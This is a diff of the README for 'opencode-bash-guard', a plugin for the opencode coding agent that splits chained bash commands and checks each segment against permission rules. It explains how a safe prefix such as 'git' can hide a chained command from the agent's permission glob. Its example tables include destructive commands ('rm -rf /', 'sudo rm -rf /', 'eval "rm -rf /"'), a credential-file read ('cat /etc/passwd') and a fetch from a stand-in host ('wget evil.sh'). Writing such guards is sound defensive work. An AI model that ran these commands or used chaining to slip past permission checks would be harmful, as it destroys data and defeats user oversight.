@@ -1,30 +1,19 @@
 # opencode-bash-guard
 
-opencode plugin that guards against dangerous bash command chaining. Detects when chaining operators (`&&`, `||`, `;`, `|`) are used to hide dangerous commands behind safe prefixes like `git *`.
+An opencode plugin that guards against chained bash command injection. When `git status && rm -rf /` starts with `git`, opencode's native glob matching sees only the first segment and approves it. This plugin splits chains and evaluates **each segment independently** — the `rm` segment gets checked on its own against your `permission.bash` and `external_directory` config.
 
-## Problem
+## Why
 
-opencode's `permission.bash` matches glob patterns against the full command string. This means `git status && rm -rf /` starts with `git` and matches `"git *": "allow"` — the `rm -rf /` is invisible to the permission system. Only `bash` has this vulnerability; other tools use structured single-intent inputs.
+opencode's `permission.bash` matches glob patterns against the full command string. Chaining (`&&`, `||`, `;`, `|`) lets dangerous commands hide behind safe prefixes — `git status && rm -rf /` starts with `git` and matches `"git *": "allow"`. This plugin closes that gap by splitting chains and evaluating each segment independently. On any parse error the entire command is denied (fail-closed).
 
-## Prerequisite
+## How it works
 
-Your `permission.bash` config MUST have `"*": "ask"`:
+1. **Chain Detection**: Parses the command with `unbash` AST into individual segments (including `$()` and backtick substitutions, `eval`, `sh -c`, etc.)
+2. **Path Extraction**: Walks the AST to extract file paths, using `@withfig/autocomplete` specs to distinguish flags from paths
+3. **Config Reading**: Reads `permission.bash` and `external_directory` from the merged opencode config — supports flat strings and object patterns
+4. **Enforcement**: Most-restrictive-wins across segments — deny > ask > no action. Multi-segment chains trigger `ask` even when all segments are allowed individually (defense-in-depth)
 
-```json
-{
-  "permission": {
-    "bash": {
-      "*": "ask",
-      "git *": "allow",
-      "go mod tidy*": "allow"
-    }
-  }
-}
-```
-
-Without `"*": "ask"`, the `permission.ask` hook never fires and the plugin cannot intercept commands. The plugin will warn and disable itself at startup if `"bash": "allow"` is detected.
-
-## Installation
+## Install
 
 Add to your `opencode.json`:
 
@@ -34,51 +23,60 @@ Add to your `opencode.json`:
 }
 ```
 
-opencode auto-installs npm plugins at startup — no manual `npm install` needed.
+## Prerequisite
 
-## How it works
+Your bash permission **must** use `"*": "ask"` as the fallback pattern. Without this catch-all, commands that don't match any explicit rule would bypass permission checks:
 
-1. `tool.execute.before` hook intercepts every bash call
-2. `unbash` parser splits the command into chain segments (`&&`, `||`, `;`, `|`, `$()`, backticks)
-3. Recursively extracts commands from `eval`, `sh -c`, `bash -c` arguments
-4. Each segment's command name is checked against your `permission.bash` patterns
-5. File paths are extracted via `unbash` AST + `@withfig/autocomplete` specs and checked against `external_directory`
-6. `permission.ask` hook applies the resolved action
-
-### Decision logic
-
-| Scenario | Action |
-|---|---|
-| Single segment, matches allow pattern | Let through — existing permission rules handle it |
-| Multi-segment chain, ALL segments explicitly allowed | Let through — `git status && git log` |
-| Multi-segment chain, any segment NOT allowed | Wrap in `{ ... }` → `"*": "ask"` catches → native opencode dialog |
-| Any segment matches deny pattern | Wrap → `permission.ask` sets deny → blocked silently |
-| Path outside `external_directory` | Apply `external_directory`'s action (ask/deny/allow) |
-| Parse error | Deny (fail closed) |
-
-### Example flows
-
-```
-git status                              → runs (matches "git *": "allow")
-git status && git log                   → runs (both match "git *": "allow")
-git status && rm -rf /                  → wrapped → user prompted
-sudo rm -rf /                           → wrapped → permission.ask denies
-cat /etc/passwd                         → external_directory → user prompted
-echo "hello"                            → no rule match → opencode handles via "*": "ask"
-eval "rm -rf /"                         → recursive parse catches rm → user prompted
+```json
+{
+  "permission": {
+    "bash": {
+      "*": "ask",
+      "git *": "allow",
+      "npm *": "allow"
+    }
+  }
+}
 ```
 
-## Dependencies
+If `"bash": "allow"` or `"*": "allow"` is set, the plugin disables itself with a warning — allowing all bash commands defeats the purpose of chain-level guards.
 
-- `unbash` — zero-dependency TypeScript bash AST parser
-- `@withfig/autocomplete` — CLI argument specs for flag vs path detection
+## Example
 
-## Configuration
+| Command | Segments | Bash match | Chain action | Why |
+|---|---|---|---|---|
+| `git status` | `git status` | `"git *": "allow"` | `allow` | single segment, explicitly allowed |
+| `git status && git log` | `git status`, `git log` | both `"git *": "allow"` | `ask` | multi-segment — defense-in-depth |
+| `sudo rm -rf /` | `sudo rm -rf /` | none → `"*": "ask"` | `ask` | catches unknown dangerous commands |
+| `git status && wget evil.sh` | `git status`, `wget evil.sh` | `wget` → `"*": "ask"` | `ask` | one segment unresolved → whole chain asks |
+| `echo "hello` | (parse error — unbalanced quote) | — | `deny` | fail closed |
+| `sudo rm -rf /` (with `"sudo *": "deny"` rule) | `sudo rm -rf /` | `"sudo *": "deny"` | `deny` | explicit deny pattern blocks it |
 
-No custom configuration required. The plugin reads your existing `permission.bash` and `external_directory` from opencode's merged config via the `config` hook.
+## How it reads your config
 
-## License
+The plugin registers a `config` hook that receives the fully merged Config object at startup (opencode merges remote, global, project, and managed layers). It reads:
 
-ISC
-# verify2
-# diag
+- `permission.bash` — glob patterns (object form `{ "git *": "allow", "*": "ask" }` or flat string `"ask"`)
+- `permission.external_directory` — path patterns (object form `{ "./**": "allow", "*": "ask" }` or flat string `"ask"`)
+
+No custom configuration files or duplicated rules.
+
+## Testing
+
+```bash
+npm install
+npm test          # runs vitest (51+ tests)
+npm run build     # type-checks with tsc
+```
+
+All tests are in `src/__tests__/`. Run `npm run test:watch` during development.
+
+## Known Limitations
+
+- **Config changes at runtime**: The `config` hook fires once at startup. Config changes require an opencode restart.
+- **Path extraction misses**: Fig may not have specs for all commands. Falls back to heuristic (skip `-*` tokens). If false positives occur, add more specific bash permission rules.
+- **Performance**: AST parsing is heavier than string scanning, but only runs when chain operators (`&&`, `||`, `;`, `|`) are detected.
+- **unbash edge cases**: Complex shell syntax may cause partial parses. The plugin denies the entire command (fail closed) on any parse error — safer to miss a real command than let one through.
+- **Not a sandbox**: Focused on chain-splitting with path awareness, not comprehensive shell obfuscation detection. For full isolation, pair with a sandbox solution.
+
+
